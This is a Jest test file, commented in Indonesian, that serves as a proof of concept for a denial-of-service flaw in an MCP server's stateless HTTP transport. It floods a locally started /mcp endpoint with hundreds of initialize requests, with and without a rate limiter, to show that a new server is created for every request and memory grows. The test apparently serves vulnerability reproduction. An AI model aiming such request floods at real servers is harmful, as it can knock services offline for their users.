import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import express from 'express';
import http from 'node:http';

// Mock docs agar tidak keluar jaringan
jest.mock('../../docs/index.js', () => ({
    createDocsSearchTool: jest.fn(async () => {})
}));

// Mock package-info.ts untuk mencegah crash __filename di Jest ESM
jest.mock('../../server/package-info.js', () => ({
    getPackageInfo: () => ({
        name: 'sei-mcp-server',
        version: '0.0.0',
        description: 'Sei MCP Server'
    })
}));

import { StreamableHttpTransport } from '../../server/transport/streamable-http.js';
import { getServer } from '../../server/server.js';
import { StreamableHTTPServerTransport } from '@modelcontextprotocol/sdk/server/streamableHttp.js';

// Custom Rate Limiter tanpa type annotation
const createRateLimiter = () => {
    let windowStart = 0;
    let requestCount = 0;
    const windowMs = 1000;
    const max = 100;

    return (req, res, next) => {
        const now = Date.now();
        if (!windowStart || (now - windowStart > windowMs)) {
            windowStart = now;
            requestCount = 0;
        }

        if (requestCount >= max) {
            return res.status(429).json({ error: 'Too Many Requests' });
        }

        requestCount++;
        next();
    };
};

describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', () => {
    let transport;
    const targetPort = 8913;
    let originalConsoleError;

    beforeAll(() => {
        originalConsoleError = console.error;
    });

    afterAll(async () => {
        console.error = originalConsoleError;
        if (transport) await transport.stop();
    });

    // TEST 1: Tanpa Rate Limiter (Bare-metal server)
    it('should trigger getServer() and memory exhaustion on concurrent requests', async () => {
        let getServerCallCount = 0;
        console.error = (...args) => {
            if (args[0] === 'Supported networks:') getServerCallCount++;
        };

        transport = new StreamableHttpTransport(targetPort, 'localhost', '/mcp', 'disabled');
        await transport.start({});

        const targetUrl = `http://localhost:${targetPort}/mcp`;
        const payload = { jsonrpc: '2.0', method: 'initialize', params: {}, id: 1 };

        const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`\n[Test 1 - No Limit] Memory before: ${memBefore.toFixed(2)} MB`);

        const attackCount = 500;
        const requests = [];
        for (let i = 0; i < attackCount; i++) {
            requests.push(
                fetch(targetUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {})
            );
        }

        await Promise.all(requests);
        await new Promise(resolve => setTimeout(resolve, 1000));

        const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`[Test 1 - No Limit] Memory after: ${memAfter.toFixed(2)} MB`);
        console.log(`[Test 1 - No Limit] getServer() triggered: ${getServerCallCount} times`);
        console.log(`[Test 1 - No Limit] Memory increased by: ${(memAfter - memBefore).toFixed(2)} MB\n`);

        expect(getServerCallCount).toBe(attackCount);
        expect(memAfter).toBeGreaterThan(memBefore);
    });

    // TEST 2: Dengan Rate Limiter (Simulasi API Gateway 100 req/s)
    it('should still cause memory exhaustion even with a rate limiter (100 req/s)', async () => {
        let getServerCallCount = 0;
        console.error = (...args) => {
            if (args[0] === 'Supported networks:') getServerCallCount++;
        };

        // Buat app Express manual dengan rate limiter, menggunakan handler yang SAMA PERSIS dengan kode asli
        const app = express();
        app.use(express.json());
        app.use(createRateLimiter()); // <-- Memasang pertahanan Rate Limiter
        
        app.post('/mcp', async (req, res) => {
            try {
                // Ini adalah kode rentan dari streamable-http.ts baris 45
                const mcpServer = await getServer();
                const httpTransport = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined });
                res.on('close', () => {
                    httpTransport.close();
                    mcpServer.close();
                });
                await mcpServer.connect(httpTransport);
                await httpTransport.handleRequest(req, res, req.body);
            } catch (error) {
                if (!res.headersSent) res.status(500).json({ error: 'Internal Server Error' });
            }
        });

        const server = app.listen(8915);
        const targetUrl = `http://localhost:8915/mcp`;
        const payload = { jsonrpc: '2.0', method: 'initialize', params: {}, id: 1 };

        const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`\n[Test 2 - With Rate Limit] Memory before: ${memBefore.toFixed(2)} MB`);

        const attackCount = 300; // Kirim 300 request
        // Kirim request dengan delay 10ms (100 req/detik) agar semua LULUS rate limit
        for (let i = 0; i < attackCount; i++) {
            fetch(targetUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
            await new Promise(resolve => setTimeout(resolve, 10)); 
        }

        // Tunggu semua request selesai diproses
        await new Promise(resolve => setTimeout(resolve, 3000));

        const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`[Test 2 - With Rate Limit] Memory after: ${memAfter.toFixed(2)} MB`);
        console.log(`[Test 2 - With Rate Limit] getServer() triggered: ${getServerCallCount} times`);
        console.log(`[Test 2 - With Rate Limit] Memory increased by: ${(memAfter - memBefore).toFixed(2)} MB\n`);

        server.close();

        // Meskipun dirate-limit, semua request yang LOLOS tetap memicu getServer()
        expect(getServerCallCount).toBe(attackCount);
        // Memory tetap membengkak karena object berat tidak bisa di-GC dengan cepat
        expect(memAfter).toBeGreaterThan(memBefore);
    });
});
